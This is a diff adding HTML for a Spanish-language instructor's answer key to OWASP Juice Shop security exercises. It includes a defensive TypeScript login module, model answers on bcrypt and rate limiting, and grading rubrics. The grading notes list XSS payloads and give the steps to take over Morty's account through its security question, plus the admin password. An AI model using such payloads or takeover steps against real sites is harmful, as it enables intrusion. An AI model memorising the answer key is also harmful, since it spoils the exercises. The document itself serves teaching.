+   <hr/>
+  </div>
+  <div class="chapter-container">
+   <h2 id="4-fuerza-bruta-y-autenticacion">
+    4. Fuerza Bruta y Autenticación
+   </h2>
+   <h3 id="ejercicio-1-desafio-reset-mortys-password">
+    Ejercicio 1: Desafío "Reset Morty's Password"
+   </h3>
+   <p>
+    <strong>
+     Contexto:
+    </strong>
+    El personaje Morty Smith (de Rick and Morty) tiene una cuenta en Juice Shop. La pregunta de seguridad es sobre su mascota.
+   </p>
+   <p>
+    <strong>
+     Paso 1 — Encontrar el email de Morty:
+    </strong>
+   </p>
+   <p>
+    Ir a la página de "Forgot Password" (
+    <code>
+     /#/forgot-password
+    </code>
+    ). Probar emails comunes:
+-
+    <code>
+     morty@juice-sh.op
+    </code>
+    — este es el correcto
+   </p>
+   <p>
+    <strong>
+     Paso 2 — Ver la pregunta de seguridad:
+    </strong>
+   </p>
+   <p>
+    Al ingresar el email, aparece la pregunta:
+    <strong>
+     "What is the name of your favorite pet?"
+    </strong>
+   </p>
+   <p>
+    <strong>
+     Paso 3 — Responder:
+    </strong>
+   </p>
+   <p>
+    En la serie Rick and Morty, Morty tiene un perro llamado
+    <strong>
+     Snuffles
+    </strong>
+    (que luego se renombra "Snowball"). La respuesta es:
+   </p>
+   <div class="highlight language-text">
+    <pre><span></span>Snuffles
+</pre>
+   </div>
+   <p>
+    <strong>
+     Paso 4 — Resetear la contraseña:
+    </strong>
+   </p>
+   <p>
+    Ingresar "Snuffles" como respuesta, poner una nueva contraseña y confirmar. El desafío se completa.
+   </p>
+   <p>
+    <strong>
+     Nota para el profesor:
+    </strong>
+    Si un alumno responde "Snowball" y no funciona, la respuesta correcta en Juice Shop es "Snuffles" (el nombre original del perro, antes de que se vuelva inteligente).
+   </p>
+   <p>
+    <strong>
+     Criterio de corrección:
+    </strong>
+    - 20% — Encuentra el email de Morty
+- 30% — Identifica que la pregunta es sobre mascotas y busca en información pública del personaje
+- 30% — Logra resetear la contraseña
+- 20% — Reflexiona sobre por qué las preguntas de seguridad son inseguras (las respuestas son información pública o adivinable)
+   </p>
+   <hr/>
+   <h3 id="ejercicio-2-modulo-completo-de-autenticacion">
+    Ejercicio 2: Módulo completo de autenticación
+   </h3>
+   <p>
+    <strong>
+     Solución esperada:
+    </strong>
+   </p>
+   <div class="highlight language-typescript">
+    <div class="collapsible-container" data-max-lines="6">
+     <pre><span></span><span class="c1">// auth.ts — Módulo de autenticación completo</span>
+<span class="k">import</span><span class="w"> </span><span class="nx">express</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">"express"</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="nx">bcrypt</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">"bcrypt"</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="nx">rateLimit</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">"express-rate-limit"</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">User</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s2">"./models/user"</span><span class="p">;</span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">router</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">express</span><span class="p">.</span><span class="nx">Router</span><span class="p">();</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">SALT_ROUNDS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">12</span><span class="p">;</span>
+
+<span class="c1">// --- Rate Limiting ---</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">loginLimiter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">rateLimit</span><span class="p">({</span>
+<span class="w">  </span><span class="nx">windowMs</span><span class="o">:</span><span class="w"> </span><span class="kt">15</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">1000</span><span class="p">,</span>
+<span class="w">  </span><span class="nx">max</span><span class="o">:</span><span class="w"> </span><span class="kt">5</span><span class="p">,</span>
+<span class="w">  </span><span class="nx">message</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s2">"Demasiados intentos. Intentá de nuevo en 15 minutos."</span><span class="w"> </span><span class="p">},</span>
+<span class="w">  </span><span class="nx">standardHeaders</span><span class="o">:</span><span class="w"> </span><span class="kt">true</span><span class="p">,</span>
+<span class="w">  </span><span class="nx">legacyHeaders</span><span class="o">:</span><span class="w"> </span><span class="kt">false</span><span class="p">,</span>
+<span class="w">  </span><span class="nx">keyGenerator</span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">email</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">ip</span><span class="p">,</span>
+<span class="p">});</span>
+
+<span class="c1">// --- Validación de contraseña ---</span>
+<span class="kd">function</span><span class="w"> </span><span class="nx">validatePassword</span><span class="p">(</span><span class="nx">password</span><span class="o">:</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="o">:</span><span class="w"> </span><span class="kt">string</span><span class="p">[]</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">errors</span><span class="o">:</span><span class="w"> </span><span class="kt">string</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">password</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">10</span><span class="p">)</span><span class="w"> </span><span class="nx">errors</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s2">"Mínimo 10 caracteres"</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="sr">/[A-Z]/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">password</span><span class="p">))</span><span class="w"> </span><span class="nx">errors</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s2">"Al menos una mayúscula"</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="sr">/[a-z]/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">password</span><span class="p">))</span><span class="w"> </span><span class="nx">errors</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s2">"Al menos una minúscula"</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="sr">/[0-9]/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">password</span><span class="p">))</span><span class="w"> </span><span class="nx">errors</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s2">"Al menos un número"</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="sr">/[^A-Za-z0-9]/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">password</span><span class="p">))</span><span class="w"> </span><span class="nx">errors</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="s2">"Al menos un carácter especial"</span><span class="p">);</span>
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">errors</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// --- Registro ---</span>
+<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">"/api/register"</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">email</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">email</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="nx">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s2">"Email y contraseña requeridos"</span><span class="w"> </span><span class="p">});</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="c1">// Validar formato de email</span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">emailRegex</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sr">/^[^\s@]+@[^\s@]+\.[^\s@]+$/</span><span class="p">;</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">emailRegex</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">email</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s2">"Formato de email inválido"</span><span class="w"> </span><span class="p">});</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="c1">// Validar complejidad de contraseña</span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">passwordErrors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">validatePassword</span><span class="p">(</span><span class="nx">password</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">passwordErrors</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s2">"Contraseña débil"</span><span class="p">,</span><span class="w"> </span><span class="nx">details</span><span class="o">:</span><span class="w"> </span><span class="kt">passwordErrors</span><span class="w"> </span><span class="p">});</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="c1">// Verificar si el email ya existe</span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">existing</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">User</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span><span class="w"> </span><span class="nx">where</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">email</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">});</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">existing</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// Respuesta genérica para no revelar qué emails están registrados</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">409</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s2">"No se pudo crear la cuenta"</span><span class="w"> </span><span class="p">});</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="c1">// Hashear y guardar</span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">bcrypt</span><span class="p">.</span><span class="nx">hash</span><span class="p">(</span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="nx">SALT_ROUNDS</span><span class="p">);</span>
+<span class="w">  </span><span class="k">await</span><span class="w"> </span><span class="nx">User</span><span class="p">.</span><span class="nx">create</span><span class="p">({</span><span class="w"> </span><span class="nx">email</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="o">:</span><span class="w"> </span><span class="kt">hash</span><span class="w"> </span><span class="p">});</span>
+
+<span class="w">  </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">201</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">message</span><span class="o">:</span><span class="w"> </span><span class="s2">"Cuenta creada exitosamente"</span><span class="w"> </span><span class="p">});</span>
+<span class="p">});</span>
+
+<span class="c1">// --- Login ---</span>
+<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">"/api/login"</span><span class="p">,</span><span class="w"> </span><span class="nx">loginLimiter</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">email</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">email</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="nx">password</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s2">"Credenciales inválidas"</span><span class="w"> </span><span class="p">});</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">User</span><span class="p">.</span><span class="nx">findOne</span><span class="p">({</span><span class="w"> </span><span class="nx">where</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">email</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="p">});</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// IMPORTANTE: no decir "email no encontrado"</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">401</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s2">"Credenciales inválidas"</span><span class="w"> </span><span class="p">});</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">match</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">bcrypt</span><span class="p">.</span><span class="nx">compare</span><span class="p">(</span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="nx">user</span><span class="p">.</span><span class="nx">password</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">match</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// IMPORTANTE: misma respuesta que si el email no existe</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">401</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s2">"Credenciales inválidas"</span><span class="w"> </span><span class="p">});</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="c1">// Login exitoso — aquí iría la generación de JWT/sesión</span>
+<span class="w">  </span><span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">message</span><span class="o">:</span><span class="w"> </span><span class="s2">"Login exitoso"</span><span class="p">,</span><span class="w"> </span><span class="nx">userId</span><span class="o">:</span><span class="w"> </span><span class="kt">user.id</span><span class="w"> </span><span class="p">});</span>
+<span class="p">});</span>
+
+<span class="k">export</span><span class="w"> </span><span class="k">default</span><span class="w"> </span><span class="nx">router</span><span class="p">;</span>
+</pre>
+    </div>
+   </div>
+   <p>
+    <strong>
+     Rúbrica de corrección:
+    </strong>
+   </p>
+   <table>
+    <thead>
+     <tr>
+      <th>
+       Requisito
+      </th>
+      <th>
+       Puntos
+      </th>
+      <th>
+       Qué verificar
+      </th>
+     </tr>
+    </thead>
+    <tbody>
+     <tr>
+      <td>
+       Validación de complejidad
+      </td>
+      <td>
+       20%
+      </td>
+      <td>
+       Verifica largo, mayúsculas, minúsculas, números, especiales
+      </td>
+     </tr>
+     <tr>
+      <td>
+       Rate limiting
+      </td>
+      <td>
+       25%
+      </td>
+      <td>
+       Usa express-rate-limit (o equivalente) con máx 5 intentos en 15 min, keyed por email
+      </td>
+     </tr>
+     <tr>
+      <td>
+       bcrypt con 12+ rounds
+      </td>
+      <td>
+       25%
+      </td>
+      <td>
+       Usa
+       <code>
+        bcrypt.hash
+       </code>
+       con saltRounds &gt;= 12,
+       <code>
+        bcrypt.compare
+       </code>
+       para verificar
+      </td>
+     </tr>
+     <tr>
+      <td>
+       Respuestas genéricas
+      </td>
+      <td>
+       20%
+      </td>
+      <td>
+       El mismo mensaje de error para email inexistente y password incorrecto
+      </td>
+     </tr>
+     <tr>
+      <td>
+       Estructura general
+      </td>
+      <td>
+       10%
+      </td>
+      <td>
+       Compila, tiene tipos TypeScript, endpoints correctos
+      </td>
+     </tr>
+    </tbody>
+   </table>
+   <p>
+    <strong>
+     Errores graves (restar puntos):
+    </strong>
+    - Guardar la contraseña en texto plano o con MD5/SHA
+- Revelar si el email existe o no en el mensaje de error
+- No tener rate limiting en el login
+- Usar
+    <code>
+     ==
+    </code>
+    para comparar passwords en vez de
+    <code>
+     bcrypt.compare
+    </code>
+   </p>
+   <hr/>
+   <h3 id="ejercicio-3-analisis-escrito">
+    Ejercicio 3: Análisis escrito
+   </h3>
+   <p>
+    <strong>
+     Respuesta modelo:
+    </strong>
+   </p>
+   <p>
+    <strong>
+     ¿Por qué la longitud mínima importa más que la complejidad?
+    </strong>
+   </p>
+   <p>
+    La entropía de una contraseña depende principalmente de su longitud. Una contraseña de 8 caracteres con mayúsculas, minúsculas, números y símbolos tiene ~52 bits de entropía. Pero una passphrase de 4 palabras aleatorias como "correct horse battery staple" tiene ~44 bits y es mucho más fácil de recordar, mientras que una de 5 palabras sube a ~55 bits. Forzar complejidad (Abc123!@) lleva a los usuarios a patrones predecibles ("P@ssw0rd1!"), mientras que exigir longitud mínima de 12-14 caracteres incentiva passphrases que son simultáneamente más fuertes y más memorables. NIST SP 800-63B (2017) recomienda exactamente esto: longitud mínima alta, sin reglas de complejidad obligatorias.
+   </p>
+   <p>
+    <strong>
+     ¿Qué diferencia hace bcrypt vs MD5/SHA?
+    </strong>
+   </p>
+   <p>
+    MD5 y SHA son funciones de hash rápidas, diseñadas para velocidad. Una GPU moderna puede calcular ~10 mil millones de hashes MD5 por segundo. Eso significa que una contraseña de 8 caracteres alfanuméricos (~41 bits) se crackea en minutos.
+   </p>
+   <p>
+    bcrypt es deliberadamente lento: con 12 rounds, cada hash tarda ~250ms en una CPU. Esto reduce la velocidad de ataque a ~4 intentos por segundo por core. La misma contraseña de 8 caracteres que se crackea en minutos con MD5, tardaría siglos con bcrypt. Además, bcrypt incluye un salt automático, previniendo ataques con rainbow tables.
+   </p>
+   <p>
+    <strong>
+     ¿Cómo el rate limiting neutraliza el script de fuerza bruta?
+    </strong>
+   </p>
+   <p>
+    El script del Problema 1 envía requests secuenciales al endpoint de login sin pausa. Sin rate limiting, puede probar cientos de contraseñas por segundo. Con
+    <code>
+     express-rate-limit
+    </code>
+    configurado a 5 intentos cada 15 minutos por email:
+   </p>
+   <ul>
+    <li>
+     El script solo prueba 5 contraseñas antes de recibir HTTP 429 (Too Many Requests)
+    </li>
+    <li>
+     Tiene que esperar 15 minutos para los siguientes 5 intentos
+    </li>
+    <li>
+     Probar las 15 contraseñas del script tomaría 45 minutos en vez de &lt;1 segundo
+    </li>
+    <li>
+     Una lista real de 10.000 contraseñas tardaría ~20 días
+    </li>
+   </ul>
+   <p>
+    Combinado con bloqueo progresivo (cada bloqueo duplica el tiempo de espera), el ataque se vuelve impráctico.
+   </p>
+   <p>
+    <strong>
+     Criterio de corrección:
+    </strong>
+   </p>
+   <table>
+    <thead>
+     <tr>
+      <th>
+       Pregunta
+      </th>
+      <th>
+       Puntos
+      </th>
+      <th>
+       Qué buscar
+      </th>
+     </tr>
+    </thead>
+    <tbody>
+     <tr>
+      <td>
+       Longitud vs complejidad
+      </td>
+      <td>
+       33%
+      </td>
+      <td>
+       Menciona entropía o espacio de búsqueda. Explica que la complejidad lleva a patrones predecibles. Bonus si cita NIST.
+      </td>
+     </tr>
+     <tr>
+      <td>
+       bcrypt vs MD5/SHA
+      </td>
+      <td>
+       33%
+      </td>
+      <td>
+       Diferencia velocidad de hash. Menciona órdenes de magnitud. Menciona salt.
+      </td>
+     </tr>
+     <tr>
+      <td>
+       Rate limiting
+      </td>
+      <td>
+       33%
+      </td>
+      <td>
+       Calcula o estima cuánto tarda el ataque con y sin limiting. Explica el HTTP 429.
+      </td>
+     </tr>
+    </tbody>
+   </table>
+   <hr/>
+  </div>
+  <div class="chapter-container">
+   <h2 id="criterios-generales-de-evaluacion">
+    Criterios generales de evaluación
+   </h2>
+   <table>
+    <thead>
+     <tr>
+      <th>
+       Componente
+      </th>
+      <th>
+       Peso
+      </th>
+      <th>
+       Descripción
+      </th>
+     </tr>
+    </thead>
+    <tbody>
+     <tr>
+      <td>
+       Desafíos completados (scoreboard)
+      </td>
+      <td>
+       30%
+      </td>
+      <td>
+       Capturas del scoreboard mostrando los desafíos resueltos
+      </td>
+     </tr>
+     <tr>
+      <td>
+       Código defensivo
+      </td>
+      <td>
+       40%
+      </td>
+      <td>
+       Funciona, compila, implementa las defensas correctas
+      </td>
+     </tr>
+     <tr>
+      <td>
+       Análisis escrito
+      </td>
+      <td>
+       20%
+      </td>
+      <td>
+       Demuestra comprensión del porqué, no solo del cómo
+      </td>
+     </tr>
+     <tr>
+      <td>
+       Documentación
+      </td>
+      <td>
+       10%
+      </td>
+      <td>
+       Capturas, pasos documentados, código comentado donde sea necesario
+      </td>
+     </tr>
+    </tbody>
+   </table>
+   <h3 id="notas-para-la-correccion">
+    Notas para la corrección
+   </h3>
+   <ol>
+    <li>
+     <p>
+      <strong>
+       SQLi en la búsqueda:
+      </strong>
+      El número de columnas del UNION puede variar según la versión de Juice Shop (8 o 9). Si el alumno tiene un número distinto pero funciona, es correcto.
+     </p>
+    </li>
+    <li>
+     <p>
+      <strong>
+       XSS payloads alternativos:
+      </strong>
+      Además de
+      <code>
+       &lt;iframe src="javascript:..."&gt;
+      </code>
+      , son válidos:
+     </p>
+     <ul>
+      <li>
+       <code>
+        &lt;img src=x onerror="alert('xss')"&gt;
+       </code>
+      </li>
+      <li>
+       <code>
+        &lt;svg onload="alert('xss')"&gt;
+       </code>
+      </li>
+      <li>
+       <code>
+        &lt;body onload="alert('xss')"&gt;
+       </code>
+      </li>
+      <li>
+       Cualquier payload que ejecute JS y sea aceptado por
+       <code>
+        innerHTML
+       </code>
+      </li>
+     </ul>
+    </li>
+    <li>
+     <p>
+      <strong>
+       Contraseña del admin:
+      </strong>
+      Es
+      <code>
+       admin123
+      </code>
+      . Si un alumno la encuentra manualmente (adivinando) sin el script, es igualmente válido — el punto es demostrar que las contraseñas débiles son vulnerables.
+     </p>
+    </li>
+    <li>
+     <p>
+      <strong>
+       Versión de Juice Shop:
+      </strong>
+      Las soluciones están basadas en Juice Shop v15+. Si los alumnos usan otra versión, algunos detalles pueden variar (IDs de productos, endpoints exactos).
+     </p>
+    </li>
+    <li>
+     <p>
+      <strong>
+       Si un alumno usa herramientas externas
+      </strong>
+      (Burp Suite, OWASP ZAP, sqlmap) para resolver los desafíos, es aceptable siempre que documente lo que hizo y entienda el principio. El objetivo es aprender, no restringir herramientas.
+     </p>
+    </li>
+   </ol>
+  </div>
+  <script type="module">
+   import mermaid from "https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.esm.min.mjs";
+        mermaid.initialize({
+            startOnLoad: true,
+            theme: "default",
+            securityLevel: "loose",
+            flowchart: {
+                useMaxWidth: true,
+                htmlLabels: true
+            }
+        });
+  </script>
+  <textarea id="css-editor" style="display:none;">pre {line-height: 125%;}
+
+td.linenos .normal {color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px;}
+
+span.linenos {color: inherit; background-color: transparent; padding-left: 5px; padding-right: 5px;}
+
+td.linenos .special {color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px;}
+
+span.linenos.special {color: #000000; background-color: #ffffc0; padding-left: 5px; padding-right: 5px;}
+
+.highlight .hll {background-color: #ffffcc;}
+
+.highlight {background: #f8f8f8; padding: 0; border-radius: 5px; margin: 15px 0; background-color: #fef6e4 !important; border: 1px solid #f0e6d4; box-shadow: 0 1px 3px rgba(0,0,0,0.1);}
+
+.highlight .c {color: #9a8052 !important; font-style: italic;}
+
+/* Comment */
+.highlight .err {border: 1px solid #F00;}
+
+/* Error */
+.highlight .k {color: #008000; font-weight: bold;}
+
+/* Keyword */
+.highlight .o {color: #666;}
+
+/* Operator */
+.highlight .ch {color: #3D7B7B; font-style: italic;}
+
+/* Comment.Hashbang */
+.highlight .cm {color: #3D7B7B; font-style: italic;}
+
+/* Comment.Multiline */
+.highlight .cp {color: #9C6500;}
+
+/* Comment.Preproc */
+.highlight .cpf {color: #3D7B7B; font-style: italic;}
+
+/* Comment.PreprocFile */
+.highlight .c1 {color: #3D7B7B; font-style: italic;}
+
+/* Comment.Single */
+.highlight .cs {color: #3D7B7B; font-style: italic;}
+
+/* Comment.Special */
+.highlight .gd {color: #A00000;}
+
+/* Generic.Deleted */
+.highlight .ge {font-style: italic;}
+
+/* Generic.Emph */
+.highlight .ges {font-weight: bold; font-style: italic;}
+
+/* Generic.EmphStrong */
+.highlight .gr {color: #E40000;}
+
+/* Generic.Error */
+.highlight .gh {color: #000080; font-weight: bold;}
+
+/* Generic.Heading */
+.highlight .gi {color: #008400;}
+
+/* Generic.Inserted */
+.highlight .go {color: #717171;}
+
+/* Generic.Output */
+.highlight .gp {color: #000080; font-weight: bold;}
+
+/* Generic.Prompt */
+.highlight .gs {font-weight: bold;}
+
+/* Generic.Strong */
+.highlight .gu {color: #800080; font-weight: bold;}
+
+/* Generic.Subheading */
+.highlight .gt {color: #04D;}
+
+/* Generic.Traceback */
+.highlight .kc {color: #008000; font-weight: bold;}
+
+/* Keyword.Constant */
+.highlight .kd {color: #008000; font-weight: bold;}
+
+/* Keyword.Declaration */
+.highlight .kn {color: #008000; font-weight: bold;}
+
+/* Keyword.Namespace */
+.highlight .kp {color: #008000;}
+
+/* Keyword.Pseudo */
+.highlight .kr {color: #008000; font-weight: bold;}
+
+/* Keyword.Reserved */
+.highlight .kt {color: #B00040;}
+
+/* Keyword.Type */
+.highlight .m {color: #666;}
+
+/* Literal.Number */
+.highlight .s {color: #BA2121;}
+
+/* Literal.String */
+.highlight .na {color: #687822;}
+
+/* Name.Attribute */
+.highlight .nb {color: #008000;}
+
+/* Name.Builtin */
+.highlight .nc {color: #00F; font-weight: bold;}
+
+/* Name.Class */
+.highlight .no {color: #800;}
+
+/* Name.Constant */
+.highlight .nd {color: #A2F;}
+
+/* Name.Decorator */
+.highlight .ni {color: #717171; font-weight: bold;}
+
+/* Name.Entity */
+.highlight .ne {color: #CB3F38; font-weight: bold;}
+
+/* Name.Exception */
+.highlight .nf {color: #00F;}
+
+/* Name.Function */
+.highlight .nl {color: #767600;}
+
+/* Name.Label */
+.highlight .nn {color: #00F; font-weight: bold;}
+
+/* Name.Namespace */
+.highlight .nt {color: #008000; font-weight: bold;}
+
+/* Name.Tag */
+.highlight .nv {color: #19177C;}
+
+/* Name.Variable */
+.highlight .ow {color: #A2F; font-weight: bold;}
+
+/* Operator.Word */
+.highlight .w {color: #BBB;}
+
+/* Text.Whitespace */
+.highlight .mb {color: #666;}
+
